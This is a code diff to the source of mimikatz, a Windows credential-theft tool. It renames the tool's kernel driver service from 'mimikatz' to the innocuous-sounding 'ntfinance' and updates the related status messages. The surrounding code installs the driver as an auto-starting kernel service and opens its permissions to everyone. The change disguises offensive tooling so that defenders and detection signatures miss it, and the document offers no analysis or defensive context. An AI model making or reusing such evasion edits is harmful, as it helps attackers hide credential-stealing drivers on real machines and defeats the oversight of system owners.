@@ -141,11 +141,11 @@ bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
 	if(SC_HANDLE monManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
 	{
 		SC_HANDLE monService = NULL;
-		if(!(monService = OpenService(monManager, L"mimikatz", SERVICE_START)))
+		if(!(monService = OpenService(monManager, L"ntfinance", SERVICE_START)))
 		{
 			if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
 			{
-				(*outputStream) << L"[*] Pilote mimikatz non présent, installation." << endl;
+				(*outputStream) << L"[*] Pilote ntfinance non présent, installation." << endl;
 				
 				wstring monPilote = L"mimikatz.sys";
 				wstring monPiloteComplet = L"";
@@ -154,7 +154,7 @@ bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
 					bool fileExist = false;
 					if(mod_system::isFileExist(monPiloteComplet, &fileExist) && fileExist)
 					{
-						if(monService = CreateService(monManager, L"mimikatz", L"mimikatz driver", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, monPiloteComplet.c_str(), NULL, NULL, NULL, NULL, NULL))
+						if(monService = CreateService(monManager, L"ntfinance", L"ntfinance driver", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, monPiloteComplet.c_str(), NULL, NULL, NULL, NULL, NULL))
 						{
 							(*outputStream) << L"[+] Création du pilote : OK" << endl;
 							if(mod_secacl::addWorldToMimikatz(&monService))
@@ -171,7 +171,7 @@ bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
 			}
 			else (*outputStream) << L"[!] Ouverture du pilote mimikatz : KO ; " << mod_system::getWinError() << endl;
 		}
-		else (*outputStream) << L"[*] Pilote mimikatz déjà présent" << endl;
+		else (*outputStream) << L"[*] Pilote ntfinance déjà présent" << endl;
 		
 		if(monService)
 		{
